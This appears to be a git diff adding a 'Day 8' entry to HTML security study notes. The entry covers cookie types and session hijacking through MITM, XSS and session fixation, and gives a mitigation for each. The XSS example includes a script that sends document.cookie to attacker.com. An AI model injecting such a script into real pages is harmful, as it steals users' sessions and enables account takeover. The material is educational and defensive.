@@ -130,6 +130,7 @@ Here, larger the primes p and q, harder it is to break the encryption.
 
 <h4>DSA Signature Generation</h4>
 <h4>
+
 1. Message Hashing: It is done using any hashing algorithms such as SHA-1 or SHA-256. This hash value is denoted by <i>H(m)</i>.
 
 
@@ -190,4 +191,99 @@ The injected script can execute in the context of the victim’s browser, allowi
 ->  The attacker sends a link or embeds malicious code (usually in an email, on a website, or in a forum post).<br>
 
 ->  If the victim is logged into a vulnerable web application, clicking the link or executing the code sends an unintended request to the server, potentially performing actions like transferring funds, changing account settings, or making posts.
+</h4>
+
+<h2>Day 8 </h2>
+<h3>Cookies</h3>
+<h4>Cookies are small pieces of data that are stored on your browser or device by websites. They are used to remember information about you and your interactions with a website over time.<br>
+Think of cookies as little notepads that websites use to store information about your visit and user preferences, making your experience more convenient and personalized.</h4>
+
+<h4>Types of Cookies</h4>
+
+<h4>1.  Session Cookies</h4>
+<h4>
+<strong>Purpose:</strong> These cookies are temporary and are erased when you close your browser. They store temporary information like whether you're logged in or not while you're actively using the website.<br>
+<strong>Example:</strong> When you log in to a site, the session cookie keeps you logged in for as long as you browse. Once you close the browser, it disappears.
+</h4>
+
+<h4>2.  Persistent Cookies</h4>
+<h4>
+<strong>Purpose:</strong> These cookies stay on your device even after you close the browser. They have an expiration date (a set amount of time), and they allow websites to remember things like login details, preferences, and settings across multiple sessions.<br>
+<strong>Example:</strong> When you visit a website, and it "remembers" your login info (so you don't have to re-enter it every time), that's a persistent cookie at work.
+</h4>
+
+<h4>3.  First-Party Cookies</h4>
+<h4>
+<strong>Purpose:</strong> These are cookies set by the website you are currently visiting.<br>
+<strong>Example:</strong> If you visit example.com, and example.com sets a cookie, that cookie is considered a first-party cookie.
+</h4>
+
+<h4>4.  Third-Party Cookies</h4>
+<h4>
+<strong>Purpose:</strong> These are cookies set by external services that are not part of the website you're visiting. They are commonly used for tracking across multiple sites for advertising purposes.<br>
+<strong>Example:</strong> When you visit a website that has an embedded ad or a social media widget (like a "Like" button from Facebook), Facebook may set a cookie to track you across the web for targeted ads.
+</h4>
+
+<h3> Session Hijacking and Cookie Stealing</h3>
+<h4>1.  Man-in-the-Middle (MITM) Attack</h4>
+<h4>
+In a MITM attack, the attacker intercepts the communication between the client and server. If the connection is not secure (HTTP instead of HTTPS), the attacker can capture the session cookie sent by the browser.
+</h4>
+
+<h4>Example of a MITM Attack:</h4>
+<h4>
+1. The victim visits example.com over HTTP.<br>
+2. The attacker, positioned between the victim and the server (e.g., on an untrusted Wi-Fi network), intercepts the communication.<br>
+3. The attacker captures the session cookie sent by the server in the HTTP response.<br>
+4. The attacker now uses the stolen session cookie to impersonate the victim.
+</h4>
+
+<h4>Mitigation:</h4>
+<h4>
+• Always use HTTPS (encrypted communication) to ensure cookies are transmitted securely.<br>
+• Ensure Secure flags are set on cookies to prevent cookies from being sent over non-HTTPS connections.
+</h4>
+
+<h4>2.  Cross-Site Scripting (XSS)</h4>
+<h4>
+XSS occurs when an attacker injects malicious JavaScript into a webpage, which is then executed in the victim’s browser. If the target site does not set the HttpOnly flag on cookies, the attacker can access cookies via JavaScript.
+</h4>
+
+<h4>Example of XSS Attack:</h4>
+<h4>
+1. The attacker finds a vulnerability (e.g., a comment form or search bar) on the target website where user input is not sanitized.<br>
+2. The attacker submits a script like this:
+</h4>
+<pre><code>
+&lt;script&gt;
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+</code></pre>
+<h4>
+3. When a victim views the page with the malicious script, the script sends the victim’s cookies to the attacker’s server.
+</h4>
+
+<h4>Mitigation:</h4>
+<h4>
+• Always use the HttpOnly flag on cookies, which prevents JavaScript from accessing them.<br>
+• Validate and sanitize all user inputs to prevent XSS.
+</h4>
+
+<h4>3.  Session Fixation Attack</h4>
+<h4>
+A session fixation attack occurs when an attacker forces a user to use a specific session ID, which the attacker has already set. When the victim logs in with that session ID, the attacker can use it to hijack the session.
+</h4>
+
+<h4>Example of Session Fixation:</h4>
+<h4>
+1. The attacker creates a session on the server, which gives them a session ID (123456).<br>
+2. The attacker tricks the victim into clicking a link that forces them to use this session ID (e.g., by appending ?sessionid=123456 to the URL).<br>
+3. The victim logs in, and the server now associates their account with the attacker’s session ID.<br>
+4. The attacker can now use the same session ID to access the victim's account.
+</h4>
+
+<h4>Mitigation:</h4>
+<h4>
+• Regenerate session IDs upon login to prevent attackers from using pre-set session IDs.<br>
+• Use Secure and SameSite flags to mitigate attacks.
 </h4>
